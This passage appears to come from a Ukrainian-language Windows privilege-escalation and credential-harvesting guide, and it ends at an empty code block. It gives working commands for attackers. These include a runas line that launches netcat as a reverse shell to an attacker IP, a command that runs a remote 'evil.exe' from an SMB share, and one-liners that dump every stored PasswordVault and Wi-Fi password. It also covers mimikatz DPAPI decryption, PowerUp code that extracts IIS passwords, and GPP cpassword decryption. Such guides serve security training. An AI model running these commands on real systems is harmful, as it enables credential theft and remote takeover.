### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримали права користувача root, можна слухати на будь-якому порту (під час першої спроби використати `nc.exe` для прослуховування порту у графічному інтерфейсі з’явиться запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Обліковий запис Linux `root` у WSL сам по собі не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перевірте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли бути записані облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` стосується старіших інсталяцій WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тож спочатку визначте фактичний дистрибутив і шлях до сховища. Уникайте виведення вмісту історії команд під час автоматизованого переліку.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Розглядайте `DefaultUserName` і `DefaultDomainName` як контекст облікового запису, а не облікові дані. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` є знахідкою відкритого пароля в реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді недоступний для читання, це лише зачіпка: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про розкриття облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Менеджер облікових даних / Windows vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичного входу користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, щоб браузери автоматично входили в ці облікові записи, але це не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і Windows Vault та застосовувати надані облікові дані замість того, щоб щоразу вводити ім’я користувача й пароль.

Якщо програми не взаємодіють із Credential Manager, то, на мою думку, вони не можуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче використовувати сховище, вона має якось **взаємодіяти з менеджером облікових даних і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використовуйте `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Тоді можна використовувати `runas` із параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений виконуваний файл запускається через спільний ресурс SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді в Universal Windows Platform (UWP) `PasswordVault` (також доступному як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його вміст можна розшифрувати вбудованими засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво отримати всі збережені імена користувачів і паролі у відкритому вигляді та розшифрувати їх:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** забезпечує метод симетричного шифрування даних і використовується переважно в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для значного підвищення ентропії в цьому шифруванні використовується секрет користувача або системи.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях із системним шифруванням використовуються секрети доменної автентифікації системи.

Зашифровані ключі RSA користувача, захищені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розміщений поруч із головним ключем, що захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому переглянути його вміст за допомогою команди `dir` у CMD не вдасться, але це можна зробити через PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Ви можете використати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем**, зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете використати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато** **masterkeys DPAPI** з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовують для **скриптингу** й автоматизації, щоб зручно зберігати зашифровані облікові дані. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що їх можна розшифрувати лише від імені того самого користувача на тому самому комп’ютері, на якому їх було створено.

Експортовані облікові дані можуть мати довільну назву файлу або шлях `.xml`. Якщо скрипт або інвентаризація файлів указує на такий файл, знайдіть фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — це лише зачіпка; [Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача й комп’ютера, на яких їх було експортовано](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а для доступу до потрібної служби відновлений обліковий запис має окремо мати відповідні права. Спершу перевірте шляхи й ACL, не виводячи під час звичайної інвентаризації зашифровані або відкриті значення.

Щоб **розшифрувати** облікові дані PS із файлу, що їх містить, можна виконати:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Менеджер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти багато DPAPI masterkeys** із пам’яті

**mRemoteNG використовує інше сховище підключень.** Перегляньте читабельні XML-файли в `%APPDATA%\mRemoteNG` і папці Documents користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Визначте схему підключень і зашифровані атрибути `Password`, перш ніж вважати XML-файл джерелом облікових даних. Збережене значення — це не пароль DPAPI/RDCMan; можливість відновлення залежить від налаштувань шифрування файлу та від того, чи використовувався власний master password. Під час широкого пошуку не виводьте зашифровані значення.

**Експорти профілів Remote Desktop Plus** також можуть бути доступні для читання в каталогах користувачів або спільній папці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційним джерелом облікових даних, не виводячи його та не припускаючи, що це відкритий текст: [зауваження постачальника](https://www.donkz.nl/) вказують, що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на яких його створили, або налаштований менш суворо. Перш ніж покладатися на нього, перевірте походження файлу й умови відновлення.

### Sticky Notes

Люди часто використовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не розуміючи, що це файл бази даних. Цей файл розташовано за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; його завжди варто пошукати й перевірити.

Іноді люди зберігають паролі та іншу інформацію в застосунках для наліпок. Упакований застосунок Sticky Notes від Microsoft зазвичай зберігає нотатки за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші застосунки можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність SQLite-файлу ознакою відсутності нотаток, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання з випереджальним записом SQLite, копія лише `plum.sqlite` може не містити останніх зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і додайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна відновити, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису або паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для запису зашифрованого менеджера паролів також потрібні фактичний ключ розшифрування та інтерпретація, специфічна для застосунку, перш ніж він зможе підтвердити вхід із вищими привілеями.

### AppCmd.exe

**Зауважте: щоб відновити паролі з AppCmd.exe, потрібно мати права Administrator і запускати його з рівнем High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано деякі **облікові дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних засобів підтримки в реєстрі

У деяких старих інсталяціях засобів віддаленої підтримки назви значень, пов’язаних із паролями, зберігаються за фіксованими ключами реєстру застосунку. Наприклад, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), у версіях TeamViewer до 9 значення `SecurityPasswordAES` позначало налаштований статичний пароль сеансу. Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, їхній формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля та авторизації для цього облікового запису. Не виводьте шифротекст і відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування і не є засобом безпеки; сам по собі він не означає, що вміст книги зашифровано. Перевіряйте лише файли, до яких маєте дозвіл і які мають стосунок до справи, та не виводьте можливі секрети під час широкого переліку. Доступний для читання шлях `.xlsx`, захищений аркуш або прихований стовпець самі по собі не доводять, що там є облікові дані чи що якийсь обліковий запис має вищі привілеї; окремо перевірте фактичні дані та поточні права облікового запису.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [TeamCity документує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html), що `system/changes` призначено для зберігання змін віддаленого запуску; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберігати видалені чи додані посилання на файл облікових даних, ключ шифрування або скрипт, який використовує їх обидва. Наприклад, у робочому процесі PowerShell із `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft документує](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ передається окремо. Спочатку перегляньте лише доступні назви патчів, а потім, маючи дозвіл, вивчіть релевантний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення чи посилання на ключ самі по собі не доводять наявність дійсних облікових даних або доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Саморобна ротація пароля локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані сховища даних — у доступному для читання файлі `.env` або поруч із бінарним файлом засобу оновлення. Перевіряйте разом заплановане завдання засобу оновлення, обліковий запис, ACL конфігурацій, слухач і дозволи сховища даних. Сховище даних, доступне лише через loopback, усе одно доступне локальному користувачу з дійсними обліковими даними, але сама автентифікація не доводить наявності дозволу на читання потрібних записів. Якщо початкове значення шифрування або ключовий матеріал доступні поруч із шифротекстом, перш ніж покладатися на шифрування, перевірте точний алгоритм виведення ключа. Схема, яка детерміновано виводить ключ AES із відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту цього пароля; у документації Go зазначено, що цей пакет не підходить для випадкових даних, чутливих до безпеки. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, переконайтеся, що він актуальний і належить обліковому запису з групи локальних адміністраторів. Заплановане завдання, шлях `.env` чи зашифрований блок самі по собі нічого з цього не доводять. Не виводьте паролі та ключовий матеріал під час звичайного переліку.

Для керованих паролів локального адміністратора використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Його сховище в каталозі або Entra та засоби контролю доступу відрізняються від спеціального локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища читати певний індекс.

### Архіви плагінів Java-серверів і повторне використання облікових даних

Деякі плагіни Java-серверів поширюються як архіви JAR у каталозі сервера `plugins`. У доступному для читання спеціальному плагіні можуть бути конфігурація або байт-код із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу та не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявності секрету, а відновлений пароль служби дає змогу отримати вищі привілеї лише тоді, коли він також дійсний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle про JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire, яка використовує вбудовану базу даних, може зберігати `openfire.script` у `Openfire\embedded-db`. Якщо поточний обліковий запис може його читати, перевірте записи `OFUSER` і властивість `passwordKey` разом. У [документації Openfire щодо постачальника користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому тексті або шифруватися ключем, який міститься в цій властивості. Відновлений пароль має значення для підвищення привілеїв лише тоді, коли він досі дійсний для ідентичності з вищими привілеями; сама назва файлу не доводить ані наявності доступу для читання, ані повторного використання облікових даних. Шлях — це лише орієнтир для інвентаризації, тож не виводьте вміст бази даних і облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти консолі адміністратора та інтерфейс прив’язки, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback; однак локальний обліковий запис усе одно може звернутися до цієї адреси, якщо слухач працює. Перевірте разом фактичний слухач, авторизовану роль адміністратора, політику завантаження плагінів і ідентичність служби Openfire. Адміністратор, який може встановлювати плагін, може запустити його код у контексті служби; це може надати високі привілеї, якщо служба працює як LocalSystem. Відповідний пароль облікового запису або доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора чи виконання коду. Див. посібник постачальника з [інсталяції та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай мають назву `server.config.yaml`, можуть містити `CA.private_key` внутрішнього CA. Якщо користувач із нижчими привілеями може читати цей ключ, він може отримати змогу випустити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Клієнтська конфігурація містить інший матеріал; її наявність не підтверджує доступу до CA сервера. У деяких розгортаннях приватний ключ CA зберігається офлайн, тож у доступній для читання конфігурації сервера ключ для підписування може бути відсутній.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та будь-яких захищених резервних копій. Один із можливих шляхів: `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо налаштований шлях служби відрізняється, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` у ньому справді є. Не виводьте приватний ключ у журнали чи результати переліку. Робочий процес постачальника `config api_client` використовує ключ CA для випуску клієнтського сертифіката, але також потрібна відповідна роль на сервері; її створення чи змінення може вимагати дозволу на запис у сховище даних або перезапуску. Наявна привілейована ідентичність сервера може забезпечити шлях, навіть якщо запис недоступний. Запити API з правами на виконання працюють у відповідному контексті сервера чи агента, який може мати високі привілеї.

Захистіть конфігурацію сервера та резервні копії обмежувальними ACL, за можливості зберігайте ключ підписування CA офлайн і обмежте ролі API та доступ до слухача. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації з налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його власне зашифроване сховище може міститися в `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, тоді як експортована резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) повідомляє, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки; на [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування власного сховища. Спершу перевірте дозволи та шляхи до файлів. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що збережені облікові дані досі чинні або надають вищі привілеї.

### Ключі хостів PuTTY SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys у реєстрі

Приватні SSH keys можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо в цьому шляху є будь-який запис, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася під час завантаження, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити кілька ключів SSH, додати їх за допомогою `ssh-add` і увійти на машину через SSH. Розділу реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за асиметричним ключем.

### Файли автоматичної інсталяції

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Доступні для читання файли резервних копій Windows Imaging (`.wim`) також можуть містити офлайн-вулики `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **назви файлів у вмісті** образу, перш ніж щось видобувати; сама назва файлу `.wim` не доводить, що в ньому є вулики, а звичайні `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. SMB-ресурс — це окремий шлях доступу; перевіряйте його лише тоді, коли він входить у межі перевірки. Див. [настанови Microsoft щодо образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідник файлів вуликів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Облікові дані хмари

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл під назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, Group Policy Objects (GPO), що зберігалися у вигляді XML-файлів у SYSVOL, були доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним ключем за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це створювало серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Шукайте такі файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
